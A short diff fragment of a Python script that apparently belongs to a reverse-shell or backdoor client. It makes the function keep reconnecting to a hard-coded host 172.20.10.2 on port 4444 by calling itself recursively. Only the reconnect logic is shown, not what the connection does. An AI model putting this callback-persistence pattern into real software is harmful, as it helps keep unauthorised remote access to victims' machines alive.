@@ -27,8 +27,8 @@ def main(HOST: str, PORT: int):
         except Exception as e:
             continue
         
-    if s.close():
-        main("172.20.10.2", 4444)
+
+    main("172.20.10.2", 4444)
 
 if __name__ == "__main__":
     main("172.20.10.2", 4444)
